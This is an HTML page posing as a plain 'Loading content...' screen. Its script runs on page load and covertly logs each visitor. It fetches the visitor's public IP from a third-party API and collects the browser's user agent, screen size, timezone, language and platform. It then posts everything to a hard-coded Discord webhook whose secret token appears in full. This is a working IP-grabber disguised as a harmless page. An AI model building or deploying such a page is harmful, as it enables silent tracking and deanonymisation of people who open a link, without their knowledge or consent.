<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading.</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #121212; color: white; }
    </style>
</head>
<body>
    <div>
        <p>Loading content...</p>
    </div>

    <script>
        async function logVisitor() {
            // 1. Get the Raw IP (Using a free public API)
            let ipData = { ip: "Unavailable" };
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                ipData = await response.json();
            } catch (e) { console.error("IP lookup failed"); }

            // 2. Collect Browser Data
            const data = {
                userAgent: navigator.userAgent,
                screenRes: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile/Tablet' : 'Desktop',
                platform: navigator.platform,
                ip: ipData.ip
            };

            // 3. Prepare the Discord Webhook Payload
            const webhookUrl = "https://discord.com/api/webhooks/1459960307282608221/hEDkoJET1YPXZQSG2hOwomLYjaunhecmlM2GKKc56U1whRJcQ5PseP_T-6vs5tGjo_bu";
            
            const payload = {
                embeds: [{
                    title: "ðŸš€ New Visitor Logged",
                    color: 5814783,
                    fields: [
                        { name: "IP Address", value: `\`${data.ip}\``, inline: true },
                        { name: "Device Type", value: data.deviceType, inline: true },
                        { name: "Language", value: data.language, inline: true },
                        { name: "Resolution", value: data.screenRes, inline: true },
                        { name: "Timezone", value: data.timezone, inline: true },
                        { name: "OS / Platform", value: data.platform, inline: true },
                        { name: "Full User-Agent", value: `\`\`\`${data.userAgent}\`\`\`` }
                    ],
                    timestamp: new Date()
                }]
            };

            // 4. Send to Discord
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(() => {
                console.log("Logged successfully.");
                // Optional: Redirect the user elsewhere after logging
                // window.location.href = "https://google.com";
            })
            .catch(err => console.error("Error logging:", err));
        }

        // Run the function when the page loads
        window.onload = logVisitor;
    </script>
</body>
</html>